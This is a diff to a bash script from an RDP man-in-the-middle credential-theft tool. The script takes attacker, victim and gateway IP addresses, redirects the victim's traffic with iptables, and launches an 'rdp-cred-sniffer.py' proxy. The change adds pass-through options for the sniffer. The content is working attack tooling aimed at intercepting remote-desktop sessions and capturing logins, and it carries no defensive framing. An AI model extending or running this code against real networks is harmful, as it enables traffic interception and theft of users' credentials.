@@ -2,10 +2,10 @@
 
 set -e
 
-if [ "$#" -ne 4 ]; then
+if [ "$#" -lt 4 ]; then
     cat << EOF
 Usage:
-$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP>
+$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP> [<RDP_SNIFFER_PARAMS>]
 EOF
     exit 1
 fi
@@ -14,6 +14,7 @@ IFACE="$1"
 ATTACKER_IP="$2"
 VICTIM_IP="$3"
 GATEWAY_IP="$4"
+RDP_SNIFFER_PARAMS="${@:5}"
 
 IP_FORWARD="$(cat /proc/sys/net/ipv4/ip_forward)"
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
@@ -94,4 +95,5 @@ set_iptables_2 A "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST"
 
 echo "[*] Run RDP proxy..."
 
-$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST"
+$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" \
+    "$ORIGINAL_DEST" $RDP_SNIFFER_PARAMS
